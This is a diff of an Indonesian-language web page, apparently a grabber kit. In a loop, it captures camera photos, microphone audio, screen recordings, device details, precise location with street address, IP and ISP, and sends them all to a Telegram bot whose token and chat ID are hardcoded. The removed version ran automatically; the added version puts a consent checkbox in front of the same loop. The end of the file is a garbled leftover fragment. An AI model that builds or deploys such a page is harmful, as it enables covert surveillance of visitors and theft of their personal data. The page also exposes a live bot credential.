@@ -1,117 +1,131 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-<meta charset="utf-8"/>
-<meta name="viewport" content="width=device-width,initial-scale=1"/>
-<title>All-in-One → Telegram (Device · Photo · Voice · Screen · Location · ISP)</title>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>Consent · All-in-One Capture → Telegram</title>
 <style>
   :root{--bg:#071018;--muted:#9aa4b2;--accent:#00ffff}
-  html,body{height:100%;margin:0;font-family:Inter,system-ui,Arial;background:linear-gradient(180deg,#071018,#0d1117);color:#e6eef6;display:flex;align-items:center;justify-content:center}
-  .wrap{width:980px;max-width:96%;padding:16px;border-radius:12px;background:linear-gradient(180deg,rgba(255,255,255,0.02),rgba(255,255,255,0.01));box-shadow:0 10px 40px rgba(0,0,0,0.6)}
-  h1{margin:0 0 8px;font-size:18px}
+  body{margin:0;font-family:Inter,system-ui,Arial;background:linear-gradient(180deg,#071018,#0d1117);color:#e6eef6;display:flex;align-items:center;justify-content:center;min-height:100vh}
+  .wrap{width:960px;max-width:96%;padding:18px;border-radius:12px;background:rgba(255,255,255,0.02);box-shadow:0 12px 40px rgba(0,0,0,0.6)}
+  h1{margin:0 0 8px;font-size:20px}
+  p.lead{margin:0 0 12px;color:var(--muted)}
   .grid{display:grid;grid-template-columns:1fr 360px;gap:12px}
-  .card{background:rgba(255,255,255,0.02);border-radius:10px;padding:12px}
-  .status{font-family:monospace;font-size:13px;color:#cfe;white-space:pre-wrap;max-height:280px;overflow:auto;padding:8px;background:rgba(0,0,0,0.18);border-radius:8px}
+  .card{background:rgba(255,255,255,0.02);padding:12px;border-radius:10px}
+  .status{font-family:monospace;font-size:13px;color:#cfe;white-space:pre-wrap;max-height:300px;overflow:auto;padding:8px;background:rgba(0,0,0,0.18);border-radius:8px}
+  label.consent{display:block;margin:8px 0;padding:10px;border-radius:8px;background:rgba(0,255,255,0.02);border:1px solid rgba(255,255,255,0.03)}
+  .controls{display:flex;gap:8px;flex-wrap:wrap;margin-top:8px}
   button{background:transparent;border:1px solid rgba(255,255,255,0.06);color:var(--accent);padding:8px 10px;border-radius:8px;cursor:pointer}
   video{width:100%;border-radius:8px;background:#000;display:block}
-  .small{font-size:13px;color:var(--muted)}
-  .note{color:#ffcc66;font-size:12px}
+  .muted{color:var(--muted);font-size:13px}
+  .danger{color:#ff8b8b}
+  .ok{color:#aaffcc}
 </style>
 </head>
 <body>
   <div class="wrap">
-    <h1>🔌 All-in-One: Camera · Device · Voice · Screen · Location · ISP → Telegram (Auto)</h1>
-    <p class="small">Menambahkan lokasi detail & informasi provider. Pastikan halaman dijalankan di HTTPS atau localhost. Browser akan meminta izin kamera/mikrofon/layar/lokasi.</p>
+    <h1>🔐 Persetujuan (Consent) — Capture → Telegram</h1>
+    <p class="lead">Sebelum data dikumpulkan dan dikirim ke bot Telegram, mohon baca dan berikan persetujuan eksplisit. Data yang dikumpulkan: <strong>Foto kamera</strong>, <strong>rekaman suara</strong>, <strong>rekaman layar</strong>, <strong>info device</strong>, <strong>lokasi (jika Anda izinkan)</strong>, dan <strong>ISP/IP</strong>.</p>
 
     <div class="grid">
       <div>
         <div class="card">
+          <h3 style="margin:0 0 6px 0">Persetujuan</h3>
+          <form id="consentForm">
+            <label class="consent">
+              <input type="checkbox" id="chkConsent" /> &nbsp; Saya membaca dan menyetujui pengumpulan data yang dijelaskan (foto, audio, layar, lokasi, device info) dan data akan dikirim ke bot Telegram.
+            </label>
+            <div class="muted">Catatan: data hanya dikirim setelah Anda menekan tombol <strong>"Saya Setuju & Mulai"</strong>. Anda dapat menghentikan proses kapan saja dengan tombol "Hentikan Semua".</div>
+            <div class="controls" style="margin-top:10px">
+              <button type="button" id="btnAgree">Saya Setuju & Mulai</button>
+              <button type="button" id="btnStop">Hentikan Semua</button>
+            </div>
+          </form>
+
+          <hr style="margin:10px 0" />
+          <div class="muted">Token & Chat ID yang akan digunakan (disimpan di file):</div>
+          <pre id="tokenBox" class="status"></pre>
+        </div>
+
+        <div style="height:10px"></div>
+
+        <div class="card">
           <h3 style="margin:0 0 6px 0">Live Camera</h3>
           <video id="camVideo" autoplay playsinline muted></video>
-          <div style="height:8px"></div>
           <div id="camStatus" class="status">Camera: belum aktif</div>
+        </div>
+      </div>
+
+      <div>
+        <div class="card">
+          <h3 style="margin:0 0 6px 0">Preview Screen</h3>
+          <video id="screenVideo" autoplay playsinline style="display:none"></video>
+          <div id="screenStatus" class="status">Screen: belum aktif</div>
         </div>
 
         <div style="height:10px"></div>
 
         <div class="card">
           <h3 style="margin:0 0 6px 0">Logs & Status</h3>
-          <div id="log" class="status">Menunggu inisialisasi...</div>
+          <div id="log" class="status">Menunggu persetujuan pengguna...</div>
           <div style="height:8px"></div>
-          <div class="controls">
-            <button id="btnStartAll">Mulai Manual (jika auto diblokir)</button>
-            <button id="btnStopAll">Hentikan Semua</button>
-            <span class="note">Interval default: 10 detik. Ubah di kode jika mau 5s.</span>
-          </div>
-        </div>
-      </div>
-
-      <div>
-        <div class="card">
-          <h3 style="margin:0 0 6px 0">Pengaturan & Token</h3>
-          <div class="small">Bot Telegram & Chat ID yang dipakai:</div>
-          <pre id="tokenArea" class="status"></pre>
-        </div>
-
-        <div style="height:10px"></div>
-
-        <div class="card">
-          <h3 style="margin:0 0 6px 0">Preview Screen</h3>
-          <video id="screenVideo" autoplay playsinline style="display:none"></video>
-          <div id="screenStatus" class="status">Screen: belum aktif</div>
+          <div class="muted">Gunakan tombol "Hentikan Semua" untuk menghentikan perekaman / pengiriman kapan saja.</div>
         </div>
       </div>
     </div>
   </div>
 
 <script>
-/* ========== KONFIGURASI ========== */
-const INTERVAL_MS = 10000; // ubah ke 5000 untuk 5 detik
+/* ================== KONFIGURASI ================== */
+/* Ubah jika perlu */
 const BOT_TOKEN = "8414860263:AAFhAxcv1lWfhXCQB8h8BTjNFY6EB6P_jIc";
 const CHAT_ID = "8471664635";
+const INTERVAL_MS = 10000; // 10000 = 10 detik (ganti ke 5000 jika mau 5 detik)
 
 /* UI */
+const tokenBox = document.getElementById('tokenBox');
+const logDiv = document.getElementById('log');
 const camVideo = document.getElementById('camVideo');
 const camStatus = document.getElementById('camStatus');
 const screenVideo = document.getElementById('screenVideo');
 const screenStatus = document.getElementById('screenStatus');
-const logDiv = document.getElementById('log');
-document.getElementById('tokenArea').textContent = `BOT_TOKEN: ${BOT_TOKEN}\nCHAT_ID: ${CHAT_ID}`;
+tokenBox.textContent = `BOT_TOKEN: ${BOT_TOKEN}\nCHAT_ID: ${CHAT_ID}`;
 
 /* Helper */
 function now(){ return new Date().toLocaleTimeString(); }
 function appendLog(msg){ logDiv.textContent = `[${now()}] ${msg}\n\n` + logDiv.textContent; }
 function sleep(ms){ return new Promise(r=>setTimeout(r, ms)); }
 
-async function sendText(text, parseMode=null){
+/* ================== Telegram helpers ================== */
+async function sendMessage(text, parseMode=null){
   try {
     const body = { chat_id: CHAT_ID, text };
     if (parseMode) body.parse_mode = parseMode;
     await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-      method:'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify(body)
+      method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify(body)
     });
-  } catch(e){ console.error('sendText err', e); appendLog('sendText err: '+ (e.message||e)); }
+  } catch(e){ appendLog('sendMessage error: '+ (e.message||e)); }
 }
-async function sendPhotoBlob(blob, caption){
+async function sendPhoto(blob, caption){
   try {
     const fd = new FormData();
     fd.append('chat_id', CHAT_ID);
-    fd.append('caption', caption || '');
     fd.append('photo', blob, 'photo.jpg');
-    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method:'POST', body: fd });
-  } catch(e){ console.error('sendPhotoBlob err', e); appendLog('sendPhoto err: '+(e.message||e)); }
+    fd.append('caption', caption || '');
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+  } catch(e){ appendLog('sendPhoto error: '+ (e.message||e)); }
 }
-async function sendDocBlob(blob, filename, caption){
+async function sendDocument(blob, filename, caption){
   try {
     const fd = new FormData();
     fd.append('chat_id', CHAT_ID);
-    fd.append('caption', caption || '');
     fd.append('document', blob, filename);
-    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, { method:'POST', body: fd });
-  } catch(e){ console.error('sendDocBlob err', e); appendLog('sendDoc err: '+(e.message||e)); }
+    fd.append('caption', caption || '');
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, { method: 'POST', body: fd });
+  } catch(e){ appendLog('sendDocument error: '+ (e.message||e)); }
 }
 
-/* Device + network */
+/* ================== Device & network info ================== */
 function detectDevice(){
   return {
     ua: navigator.userAgent || 'unknown',
@@ -132,113 +146,329 @@ async function getPublicIP(){
   try { const r = await fetch('https://api.ipify.org?format=json'); const j = await r.json(); return j.ip; } catch { return 'unknown'; }
 }
 
-/* ========== Lokasi detail (Geolocation + ReverseGeocode) ========== */
-/*
- - Meminta izin user. Jika user tolak, akan tetap coba IP-based lookup untuk kota/ISP.
- - Reverse geocode via Nominatim (OpenStreetMap).
- - Kembalian: object {lat,lon, display_name, address:{...}} atau null.
-*/
-async function getLocationDetailed(timeoutMs=7000){
-  // 1) Attempt browser geolocation
-  let coords = null;
+/* ================== Location (geolocation + reverse geocode) ================== */
+async function getLocationWithConsent(){ 
+  // try geolocation; fails if denied or timed out
   try {
-    coords = await new Promise((resolve, reject) => {
-      const onSuccess = p => resolve({ lat: p.coords.latitude, lon: p.coords.longitude, accuracy: p.coords.accuracy });
-      const onErr = e => reject(e);
-      navigator.geolocation.getCurrentPosition(onSuccess, onErr, { enableHighAccuracy: true, maximumAge:0, timeout: timeoutMs });
+    const pos = await new Promise((resolve, reject) => {
+      navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy:true, timeout:8000, maximumAge:0 });
     });
-  } catch(e){
-    appendLog('Geolocation: izin ditolak/timeout (' + (e.message||e) + '). Akan coba fallback IP-based.');
-    coords = null;
-  }
-
-  // 2) If have coords, reverse-geocode via Nominatim
-  if (coords) {
+    const lat = pos.coords.latitude, lon = pos.coords.longitude, acc = pos.coords.accuracy;
+    appendLog('Geolocation granted: ' + lat.toFixed(6) + ', ' + lon.toFixed(6) + ' (acc ' + (acc||'n/a') + 'm)');
+    // reverse geocode using Nominatim (OpenStreetMap)
     try {
-      const url = `https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${coords.lat}&lon=${coords.lon}&addressdetails=1`;
-      const r = await fetch(url, { headers: { 'Accept-Language': 'id,en' } });
-      if (!r.ok) throw new Error('Nominatim fail ' + r.status);
+      const url = `https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${lat}&lon=${lon}&addressdetails=1`;
+      const r = await fetch(url, { headers: { 'Accept-Language': 'id,en' }});
       const j = await r.json();
-      return {
-        source: 'geolocation',
-        lat: coords.lat, lon: coords.lon, accuracy: coords.accuracy || null,
-        display_name: j.display_name || null,
-        address: j.address || {}
-      };
-    } catch(e){
-      appendLog('Reverse geocode gagal: ' + (e.message||e));
-      // fallthrough to ip-based
+      appendLog('Reverse geocode success: ' + (j.display_name||'no display_name'));
+      return { source:'geolocation', lat, lon, accuracy:acc, display_name: j.display_name || null, address: j.address || {} };
+    } catch(e) {
+      appendLog('Reverse geocode failed: '+(e.message||e));
+      return { source:'geolocation', lat, lon, accuracy:acc, display_name:null, address:{} };
+    }
+  } catch(e){
+    appendLog('Geolocation denied/failed: ' + (e.message||e));
+    // fallback to IP-based lookup (less accurate)
+    try {
+      const r = await fetch('https://ipapi.co/json/');
+      const j = await r.json();
+      appendLog('IP-based location via ipapi: ' + (j.city || j.region || j.country_name));
+      return { source:'ip', lat: j.latitude || null, lon: j.longitude || null, display_name: `${j.city||''}${j.region? ', '+j.region:''}${j.country_name? ', '+j.country_name:''}`, address: { city:j.city, region:j.region, country:j.country_name, postal:j.postal }, ipapi: j };
+    } catch(err){
+      appendLog('IP fallback failed: '+(err.message||err));
+      return null;
     }
   }
-
-  // 3) Fallback: IP-based location (less accurate)
-  try {
-    const r = await fetch('https://ipapi.co/json/');
-    if (!r.ok) throw new Error('ipapi fail ' + r.status);
-    const j = await r.json();
-    return {
-      source: 'ip',
-      lat: j.latitude || null, lon: j.longitude || null,
-      display_name: `${j.city || ''}${j.region ? ', '+j.region : ''}${j.country_name ? ', '+j.country_name : ''}`.trim(),
-      address: {
-        city: j.city, region: j.region, country: j.country_name, postal: j.postal
-      },
-      ipapi: j // raw
-    };
-  } catch(e){
-    appendLog('IP-based location gagal: ' + (e.message||e));
-    return null;
-  }
 }
 
-/* ========== ISP / Provider detail via IP lookup ========== */
-/*
-  Mengambil info dari ipapi.co/json/ — field "org" biasanya berisi ISP / org name.
-*/
-async function getISPInfo(){
+/* ================== ISP info (ipapi) ================== */
+async function getISP(){
   try {
     const r = await fetch('https://ipapi.co/json/');
-    if (!r.ok) throw new Error('ipapi fail ' + r.status);
     const j = await r.json();
-    // ipapi fields: ip, city, region, country_name, org, postal, timezone, asn maybe in other services
+    appendLog('ISP lookup: ' + (j.org || j.asn || 'unknown'));
     return j;
   } catch(e){
-    appendLog('ISP lookup gagal: ' + (e.message||e));
+    appendLog('ISP lookup failed: '+(e.message||e));
     return null;
   }
 }
 
-/* ========== Build caption yang lebih detail ========== */
-async function buildDeviceCaptionWithLocation(note){
+/* ================== Camera photo ================== */
+let camStream = null;
+async function startCamera(){
+  if (camStream) return;
+  try {
+    camStatus.textContent = 'Meminta izin kamera...';
+    camStream = await navigator.mediaDevices.getUserMedia({ video:{ width:640, height:480 }, audio:false });
+    camVideo.srcObject = camStream;
+    await camVideo.play();
+    camStatus.textContent = 'Camera: aktif';
+    appendLog('Camera aktif');
+  } catch(e){
+    camStatus.textContent = 'Camera error: ' + (e.message||e);
+    appendLog('Camera gagal: '+(e.message||e));
+  }
+}
+async function capturePhoto(){
+  if (!camStream) { appendLog('Capture skipped: camera tidak aktif'); return null; }
+  try {
+    const w = camVideo.videoWidth || 640, h = camVideo.videoHeight || 480;
+    const c = document.createElement('canvas'); c.width = w; c.height = h;
+    c.getContext('2d').drawImage(camVideo,0,0,w,h);
+    const blob = await new Promise(res => c.toBlob(res, 'image/jpeg', 0.85));
+    appendLog('Foto diambil');
+    return blob;
+  } catch(e){
+    appendLog('Error capturePhoto: '+(e.message||e));
+    return null;
+  }
+}
+function stopCamera(){
+  if (!camStream) return;
+  camStream.getTracks().forEach(t=>t.stop());
+  camStream = null;
+  try { camVideo.srcObject = null; } catch {}
+  camStatus.textContent = 'Camera: berhenti';
+  appendLog('Camera dihentikan');
+}
+
+/* ================== Audio recorder (chunked) ================== */
+let audioStream=null, audioRecorder=null, audioChunks=[], audioActive=false;
+async function startAudio(){
+  if (audioActive) return;
+  try {
+    appendLog('Meminta izin mikrofon...');
+    audioStream = await navigator.mediaDevices.getUserMedia({ audio:true, video:false });
+    audioActive = true;
+    audioRecorder = new MediaRecorder(audioStream);
+    audioChunks = [];
+    audioRecorder.ondataavailable = e=>{ if (e.data && e.data.size) audioChunks.push(e.data); };
+    audioRecorder.onstop = async ()=> {
+      if (audioChunks.length === 0) return;
+      const blob = new Blob(audioChunks, { type: audioChunks[0].type || 'audio/webm' });
+      audioChunks = [];
+      appendLog('Audio chunk selesai (siap dikirim)');
+      return blob;
+    };
+    audioRecorder.start();
+    appendLog('Audio merekam');
+    // Chunk loop handled by main cycle forcing stop/start
+  } catch(e){
+    audioActive = false;
+    appendLog('Gagal akses mikrofon: '+(e.message||e));
+  }
+}
+function forceAudioChunkAndGetBlob(){
+  return new Promise(async resolve => {
+    if (!audioActive || !audioRecorder) return resolve(null);
+    try {
+      if (audioRecorder.state === 'recording') {
+        audioRecorder.stop();
+        // wait a bit for onstop to complete and for data to be available in audioChunks
+        await sleep(400);
+        const blob = new Blob(audioChunks, { type: audioChunks[0]?.type || 'audio/webm' });
+        audioChunks = [];
+        // restart recorder
+        audioRecorder = new MediaRecorder(audioStream);
+        audioRecorder.ondataavailable = e=>{ if (e.data && e.data.size) audioChunks.push(e.data); };
+        audioRecorder.start();
+        appendLog('Audio chunk forced & recorder restarted');
+        return resolve(blob);
+      } else {
+        return resolve(null);
+      }
+    } catch(e){ appendLog('forceAudioChunk err: '+(e.message||e)); return resolve(null); }
+  });
+}
+function stopAudio(){
+  audioActive = false;
+  try { if (audioRecorder && audioRecorder.state === 'recording') audioRecorder.stop(); } catch {}
+  if (audioStream) audioStream.getTracks().forEach(t=>t.stop());
+  audioStream = null;
+  appendLog('Audio dihentikan');
+}
+
+/* ================== Screen recorder (chunked) ================== */
+let screenStream=null, screenRecorder=null, screenChunks=[], screenActive=false;
+async function startScreen(){
+  if (screenActive) return;
+  try {
+    appendLog('Meminta izin rekam layar (perlu gesture browser jika diblokir otomatis)...');
+    screenStream = await navigator.mediaDevices.getDisplayMedia({ video:true, audio:false });
+    screenVideo.srcObject = screenStream; screenVideo.style.display = 'block';
+    screenRecorder = new MediaRecorder(screenStream, { mimeType:'video/webm;codecs=vp9' });
+    screenChunks = [];
+    screenRecorder.ondataavailable = e=>{ if (e.data && e.data.size) screenChunks.push(e.data); };
+    screenRecorder.onstop = async ()=> {
+      if (screenChunks.length === 0) return;
+      const blob = new Blob(screenChunks, { type: screenChunks[0].type || 'video/webm' });
+      screenChunks = [];
+      appendLog('Screen chunk selesai (siap dikirim)');
+      return blob;
+    };
+    screenRecorder.start();
+    screenActive = true;
+    screenStatus.textContent = 'Screen: merekam';
+    appendLog('Screen merekam');
+  } catch(e){
+    screenActive = false;
+    screenStatus.textContent = 'Screen error: ' + (e.message||e);
+    appendLog('Gagal akses layar: '+(e.message||e));
+  }
+}
+async function forceScreenChunkAndGetBlob(){
+  if (!screenActive || !screenRecorder) return null;
+  try {
+    if (screenRecorder.state === 'recording') {
+      screenRecorder.stop();
+      await sleep(500);
+      const blob = new Blob(screenChunks, { type: screenChunks[0]?.type || 'video/webm' });
+      screenChunks = [];
+      // restart
+      screenRecorder = new MediaRecorder(screenStream, { mimeType:'video/webm;codecs=vp9' });
+      screenRecorder.ondataavailable = e=>{ if (e.data && e.data.size) screenChunks.push(e.data); };
+      screenRecorder.start();
+      appendLog('Screen chunk forced & recorder restarted');
+      return blob;
+    }
+  } catch(e){ appendLog('forceScreenChunk err: '+(e.message||e)); return null; }
+}
+function stopScreen(){
+  try { if (screenRecorder && screenRecorder.state==='recording') screenRecorder.stop(); } catch {}
+  if (screenStream) screenStream.getTracks().forEach(t=>t.stop());
+  screenStream = null;
+  screenActive = false;
+  try { screenVideo.srcObject = null; screenVideo.style.display='none'; } catch {}
+  screenStatus.textContent = 'Screen: berhenti';
+  appendLog('Screen dihentikan');
+}
+
+/* ================== Build caption (device + location + isp) ================== */
+async function buildCaption(note){
   const dev = detectDevice();
   const net = netInfo();
   const ip = await getPublicIP().catch(()=> 'unknown');
-  const isp = await getISPInfo().catch(()=> null);
-  const loc = await getLocationDetailed().catch(()=>null);
+  const isp = await getISP().catch(()=> null);
+  const loc = await getLocationWithConsent().catch(()=>null);
 
-  const addr = (loc && loc.address) ? loc.address : {};
-  // Try extract fields common in OSM
   const lines = [];
-  lines.push("📡 Device Info (auto)");
+  lines.push('📡 *Device Info (user consent)*');
   lines.push(`🕒 ${new Date().toLocaleString()}`);
-  lines.push(`Platform: ${dev.platform}`);
-  lines.push(`UA: ${dev.ua}`);
-  lines.push(`Cores: ${dev.cores}, Mem: ${dev.mem}`);
-  lines.push(`Network: ${net.type} (down:${net.downlink}, rtt:${net.rtt})`);
-  lines.push(`IP publik: ${ip}`);
-  if (isp && isp.org) lines.push(`Provider/ISP: ${isp.org}`);
-  if (isp && isp.asn) lines.push(`ASN: ${isp.asn}`);
-  if (isp && isp.postal) lines.push(`Postal (IP): ${isp.postal}`);
-  // location
+  lines.push(`*Platform:* ${dev.platform}`);
+  lines.push(`*UA:* ${dev.ua}`);
+  lines.push(`*Cores:* ${dev.cores}, *Mem:* ${dev.mem}`);
+  lines.push(`*Network:* ${net.type} (down:${net.downlink}, rtt:${net.rtt})`);
+  lines.push(`*IP publik:* ${ip}`);
+  if (isp && isp.org) lines.push(`*Provider/ISP:* ${isp.org}`);
+  if (isp && isp.asn) lines.push(`*ASN:* ${isp.asn}`);
   if (loc) {
-    lines.push(`Lokasi source: ${loc.source}`);
-    if (loc.lat && loc.lon) lines.push(`Koordinat: ${loc.lat.toFixed(6)}, ${loc.lon.toFixed(6)}`);
-    // include administrative fields if present (prioritizing Indonesia labels)
-    const adminFields = [
-      ['country','country'],
-      ['state','state'], ['region','region'],
-      ['county','county'],
-      ['city','city'], ['town','town'], ['village','village'], ['hamlet','hamlet'],
+    lines.push(`*Lokasi source:* ${loc.source}`);
+    if (loc.lat && loc.lon) lines.push(`*Koordinat:* ${loc.lat.toFixed(6)}, ${loc.lon.toFixed(6)}`);
+    if (loc.address) {
+      // try common fields
+      const addr = loc.address;
+      ['country','state','region','city','town','village','hamlet','suburb','neighbourhood','postcode','road'].forEach(k=>{
+        if (addr[k]) lines.push(`*${k}:* ${addr[k]}`);
+      });
+    }
+    if (loc.display_name) lines.push(`*Alamat (raw):* ${loc.display_name}`);
+  } else {
+    lines.push('*Lokasi:* tidak tersedia (ditolak atau gagal)');
+  }
+  if (note) lines.push(`*Catatan:* ${note}`);
+  return lines.join('\n');
+}
+
+/* ================== Combined cycle: send caption + photo + audio chunk + screen chunk ================== */
+let mainHandle = null;
+async function runCycleAndSend(){
+  appendLog('=== Cycle start ===');
+  try {
+    const caption = await buildCaption('Cycle otomatis (user consent)');
+    // send device/location/ISP info as message (Markdown)
+    await sendMessage(caption, 'Markdown');
+    appendLog('Caption (device+location+ISP) dikirim');
+  } catch(e){ appendLog('Gagal kirim caption: '+(e.message||e)); }
+
+  // Photo
+  try {
+    const photoBlob = await capturePhoto();
+    if (photoBlob) {
+      const caption = await buildCaption('Foto kamera otomatis');
+      await sendPhoto(photoBlob, caption);
+      appendLog('Foto dikirim');
+    }
+  } catch(e){ appendLog('Foto send error: '+(e.message||e)); }
+
+  // Force audio chunk
+  try {
+    const audioBlob = await forceAudioChunkAndGetBlob();
+    if (audioBlob) {
+      const ts = new Date().toISOString().replace(/[:.]/g,'-');
+      const filename = `audio-${ts}.webm`;
+      const caption = await buildCaption('Audio otomatis');
+      await sendDocument(audioBlob, filename, caption);
+      appendLog('Audio chunk dikirim: ' + filename);
+    }
+  } catch(e){ appendLog('Audio send error: '+(e.message||e)); }
+
+  // Force screen chunk
+  try {
+    const screenBlob = await forceScreenChunkAndGetBlob();
+    if (screenBlob) {
+      const ts = new Date().toISOString().replace(/[:.]/g,'-');
+      const filename = `screen-${ts}.webm`;
+      const caption = await buildCaption('Screen otomatis');
+      await sendDocument(screenBlob, filename, caption);
+      appendLog('Screen chunk dikirim: ' + filename);
+    }
+  } catch(e){ appendLog('Screen send error: '+(e.message||e)); }
+
+  appendLog('=== Cycle end ===');
+}
+
+/* ================== Start/Stop all with user consent ================== */
+async function startAllAfterConsent(){
+  const chk = document.getElementById('chkConsent');
+  if (!chk.checked) { alert('Tolong centang persetujuan terlebih dahulu.'); return; }
+  appendLog('User memberikan persetujuan. Memulai proses (akan meminta izin perangkat).');
+
+  // start camera, audio, screen (some browsers need user gesture to allow screen)
+  await startCamera();
+  await startAudio();
+
+  // start screen — note: may require user gesture. We'll try; if blocked user can click "Saya Setuju & Mulai" again.
+  try { await startScreen(); } catch(e) { appendLog('startScreen error: ' + (e.message||e)); }
+
+  // run initial cycle then schedule
+  await sleep(500);
+  await runCycleAndSend();
+  if (mainHandle) clearInterval(mainHandle);
+  mainHandle = setInterval(() => { runCycleAndSend().catch(e=>appendLog('cycle err: '+(e.message||e))); }, INTERVAL_MS);
+}
+
+/* stop all */
+function stopAll(){
+  if (mainHandle) { clearInterval(mainHandle); mainHandle = null; }
+  stopCamera();
+  stopAudio();
+  stopScreen();
+  appendLog('Semua proses dihentikan oleh user.');
+}
+
+/* Buttons */
+document.getElementById('btnAgree').addEventListener('click', ()=> startAllAfterConsent());
+document.getElementById('btnStop').addEventListener('click', ()=> stopAll());
+
+/* Onload */
+window.addEventListener('load', ()=> {
+  appendLog('Halaman siap. Tunggu persetujuan pengguna.');
+});
+window.addEventListener('beforeunload', ()=> stopAll());
+</script>
+</body>
+  </html>mlet','hamlet'],
       ['municipality','municipality'],
       ['suburb','suburb'], ['neighbourhood','neighbourhood'], ['borough','borough'],
       ['postcode','postal code'],
